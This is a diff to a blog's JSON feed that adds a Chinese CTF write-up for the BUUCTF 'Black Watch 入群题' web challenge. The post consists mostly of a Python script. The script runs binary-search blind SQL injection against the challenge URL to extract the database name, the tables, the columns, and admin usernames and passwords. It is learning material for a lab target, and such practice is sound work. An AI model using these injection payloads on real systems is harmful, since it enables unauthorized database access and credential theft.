@@ -67,6 +67,17 @@
             ]
         },
         {
+            "id": "http://odiws.github.io/2024/09/10/%E5%85%A5%E7%BE%A4%E9%A2%98-Web/",
+            "url": "http://odiws.github.io/2024/09/10/%E5%85%A5%E7%BE%A4%E9%A2%98-Web/",
+            "title": "入群题]Web",
+            "date_published": "2024-09-10T11:32:08.000Z",
+            "content_html": "<h2 id=\"black-watch-入群题web\"><a class=\"markdownIt-Anchor\" href=\"#black-watch-入群题web\">#</a> [Black Watch 入群题] Web</h2>\n<h2 id=\"1\"><a class=\"markdownIt-Anchor\" href=\"#1\">#</a> <img data-src=\"../images/%E5%85%A5%E7%BE%A4/1.png\" alt=\"1\"></h2>\n<p>发现可以 SQL 注入，盲注（json 数据需先解码）：</p>\n<pre><code>import requests\n\nflag = ''\n# 查库名\npayload1 = '1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1'  # 库名为news\n\n# 查表名\npayload2 = '1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\'news\\')),&#123;&#125;,1))&gt;&#123;&#125;)^1'  # 表名为admin,contents\n\n# 查字段\npayload3 = '1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\\'contents\\')),&#123;&#125;,1))&gt;&#123;&#125;)^1'  # admin表里有id,username,password,is_enable\n# contents表里有id,title,content,is_enable\n\n# 查字段值\npayload4 = '1^(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)^1'  # 分别查username和password\n\nfor i in range(1, 100):\n    low = 28\n    high = 137\n    mid = (low + high) // 2\n\n    while (low &lt; high):\n        url = 'http://8925938b-be36-44ef-a411-70363c14ef36.node5.buuoj.cn:81/backend/content_detail.php?id='\n        payload = payload4.format(i, mid)\n        url += payload\n        print(url)\n        r = requests.get(url)\n        text = str(r.json())\n\n        if &quot;札师傅缺个女朋友&quot; in text:\n            low = mid + 1\n        else:\n            high = mid\n\n        mid = (low + high) // 2\n\n    if (chr(mid) == ''):\n        break\n    flag += chr(mid)\n    print(flag)\n\nprint(flag)\n\n# 这个代码使用了id=1时的情况,使用了二分法提高了查询的速度\n</code></pre>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjYzOTUxL2FydGljbGUvZGV0YWlscy8xMTkwNTk0ODU=\">https://blog.csdn.net/qq_46263951/article/details/119059485</span></p>\n",
+            "tags": [
+                "buuctf",
+                "sql注入"
+            ]
+        },
+        {
             "id": "http://odiws.github.io/2024/08/28/RoarCTF2019-OnlineProxy/",
             "url": "http://odiws.github.io/2024/08/28/RoarCTF2019-OnlineProxy/",
             "title": "[RoarCTF2019]OnlineProxy",
